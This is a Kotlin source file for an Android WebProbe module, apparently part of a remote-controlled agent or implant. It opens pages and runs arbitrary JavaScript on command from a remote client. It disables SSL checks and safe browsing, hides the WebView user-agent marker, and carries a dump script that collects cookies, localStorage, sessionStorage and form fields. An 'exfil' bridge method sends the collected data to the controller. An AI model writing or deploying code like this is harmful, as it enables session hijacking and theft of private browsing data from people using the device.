package ai.obsidian.agent.web

import ai.obsidian.agent.AgentApp
import android.annotation.SuppressLint
import android.content.Context
import android.net.http.SslError
import android.os.Handler
import android.os.Looper
import android.webkit.CookieManager
import android.webkit.JavascriptInterface
import android.webkit.SslErrorHandler
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import kotlinx.coroutines.launch

@SuppressLint("SetJavaScriptEnabled")
object WebProbe {

    private val mainHandler = Handler(Looper.getMainLooper())
    private var view: WebView? = null

    fun run(context: Context, sub: String, argument: String) {
        val app = context.applicationContext as AgentApp
        mainHandler.post {
            val webView = view ?: create(context, app).also { view = it }
            when (sub) {
                "open" -> webView.loadUrl(argument)
                "eval" -> webView.evaluateJavascript(argument) { result ->
                    app.scope.launch { app.requireClient().send("msg", "JS $result") }
                }
                "dump" -> webView.evaluateJavascript(DUMP_SCRIPT) { result ->
                    app.scope.launch {
                        app.requireClient().send("msg", "DUMP ${result.length} chars")
                        app.requireClient().send("chunk", result)
                    }
                }
                else -> app.scope.launch { app.requireClient().send("msg", "web open|eval|dump") }
            }
        }
    }

    private fun create(context: Context, app: AgentApp): WebView = WebView(context).apply {
        settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            @Suppress("DEPRECATION")
            setAllowUniversalAccessFromFileURLs(true)
            @Suppress("DEPRECATION")
            setAllowFileAccessFromFileURLs(true)
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = userAgentString.replace("; wv", "")
            mediaPlaybackRequiresUserGesture = false
            safeBrowsingEnabled = false
        }

        WebView.setWebContentsDebuggingEnabled(true)
        addJavascriptInterface(Bridge(app), "OBS")

        webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(
                webView: WebView?,
                handler: SslErrorHandler?,
                error: SslError?
            ) {
                handler?.proceed()
            }

            override fun shouldOverrideUrlLoading(
                webView: WebView?,
                request: WebResourceRequest?
            ): Boolean = false
        }

        CookieManager.getInstance().setAcceptThirdPartyCookies(this, true)
    }

    private val DUMP_SCRIPT = """
        (function () {
          var out = {
            url: location.href,
            title: document.title,
            cookies: document.cookie,
            local: Object.assign({}, localStorage),
            session: Object.assign({}, sessionStorage)
          };
          try {
            out.forms = Array.prototype.map.call(document.forms, function (f) {
              return Array.prototype.map.call(f.elements, function (e) {
                return [e.name, e.type];
              });
            });
          } catch (e) {}
          return JSON.stringify(out);
        })()
    """.trimIndent()

    class Bridge(private val app: AgentApp) {
        @JavascriptInterface
        fun exfil(label: String, data: String) {
            app.scope.launch {
                app.requireClient().send("msg", "BRIDGE $label ${data.take(4000)}")
            }
        }
    }
}
